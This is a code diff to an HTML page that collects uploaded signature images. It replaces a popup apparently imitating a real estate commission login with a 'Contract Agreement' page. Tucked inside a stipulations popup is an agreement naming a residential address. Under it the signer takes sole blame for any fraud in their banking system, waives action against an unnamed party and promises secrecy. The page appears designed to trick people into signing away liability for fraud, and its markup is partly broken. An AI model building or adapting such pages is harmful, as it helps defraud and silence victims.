@@ -130,26 +130,96 @@
       xhr.send('signature=' + encodeURIComponent(signatureImage));
     }
   </script>
+  
+  <script>
+    function showPopup() {
+      document.getElementById("popup").style.display = "block";
+    }
+
+    function closePopup() {
+      document.getElementById("popup").style.display = "none";
+    }
+
+    function showPopupMessage() {
+      // Add your logic for displaying a popup message on page load if needed
+    }
+
+    function forwardSignature() {
+      // Add your logic for handling the signature and date submission if needed
+    }
+  </script>
 </head>
-<body onload="showPopupMessage()">
+<body<body onload="showPopupMessage()">
   <div class="container">
-    <h1>Signature Upload</h1>
-    <p>Please upload your signature below. You can draw it yourself or upload a photo.</p>
+    <h1>Contract Agreement</h1>
+    <p>This is a contract agreement between [Your Company Name] and the undersigned individual.</p>
+    <button class="open-popup" onclick="showPopup()">View Stipulations</button>
     <form>
       <div class="form-group">
         <label for="signature">Signature:</label>
         <input type="file" id="signature" name="signature" accept="image/*" capture="user">
+      </div>
+      <div class="form-group">
+        <label for="date">Date:</label>
+        <input type="date" id="date" name="date">
       </div>
       <div class="button-container">
         <button type="button" class="submit-button" onclick="forwardSignature()">Submit</button>
       </div>
     </form>
   </div>
-<!-- Popup message -->
+
+  <!-- Stipulations Popup -->
   <div id="popup" class="popup">
     <div class="popup-content">
-      <h2>Welcome Back to Cal Real Estate Commission, April!</h2>
-      <p>You have successfully logged back in.</p> <button onclick="closePopup()">Exit</button>
+      <h2>Stipulations</h2>
+      <ul>
+        <li>Stipulation 1: Lorem ipsum dolor sit amet.</li>
+        <li>Stipulation 2: Consectetur adipiscing elit.</li>
+        <li>Stipulation 3: Proin volutpat lacus a dui sodales.</li>
+        <!-- Add more stipulations as needed -->
+      </ul>
+      <h2>Terms of Service and Confidentiality Agreement</h2>
+      <p>
+        This Confidentiality and Legal Protection Agreement (the "Agreement") is entered into as of 9/10/23 (the "Effective Date") by and between the individual(s) residing at 3039 Eucalyptus Hill Rd (hereinafter referred to as the "First Party"), and an unnamed party (hereinafter referred to as the "Second Party").
+      </p>
+      <p>
+        WHEREAS, the Second Party desires to ensure their legal protection in the event of any future legal conflict arising between the parties, and
+      </p>
+      <p>
+        WHEREAS, the First Party acknowledges and accepts that any fraudulent activity within their banking system shall be deemed their own attempt to deceive the system, absolving the Second Party of any accusations or legal actions,
+      </p>
+      <p>
+        NOW, THEREFORE, in consideration of the mutual promises and covenants contained herein, the Parties agree as follows:
+      </p>
+      <p>
+        Legal Protection: The First Party hereby acknowledges and agrees that in the event of any future legal conflict arising between the parties, specifically related to any alleged fraud within their banking system, they shall bear sole responsibility for any such fraudulent activity and shall not implicate, accuse, or initiate any legal action against the Second Party for any involvement or association therewith.
+      </p>
+      <p>
+        Confidentiality: The First Party acknowledges their obligation to maintain the utmost confidentiality regarding the terms and provisions of this Agreement. The First Party shall not disclose, discuss, or disseminate any information related to this Agreement to any third party without the prior written consent of the Second Party, unless required by law.
+      </p>
+      <p>
+        Entire Agreement: This Agreement constitutes the entire understanding between the Parties and supersedes any prior discussions, negotiations, or agreements, whether written or oral, relating to the subject matter hereof.
+      </p>
+      <p>
+        Governing Law and Jurisdiction: This Agreement shall This Agreement shall be governed by and construed in accordance with the laws of the jurisdiction in which the First Party resides. Any disputes arising out of or in connection with this Agreement shall be subject to the exclusive jurisdiction of the courts of said jurisdiction.
+      </p>
+      <p>
+        IN WITNESS WHEREOF, the Parties hereto have executed this Confidentiality and Legal Protection Agreement as of the Effective Date.
+      </p>
+      <p>
+        [First Party]
+        [First Party's Signature]
+        [Date]
+      </p>
+      <p>
+        [Second Party]
+        [Second Party's Signature]
+        [Date]
+      </p>
+      <button onclick="closePopup()">Close</button>
     </div>
+  </div>
 </body>
+
 </html>
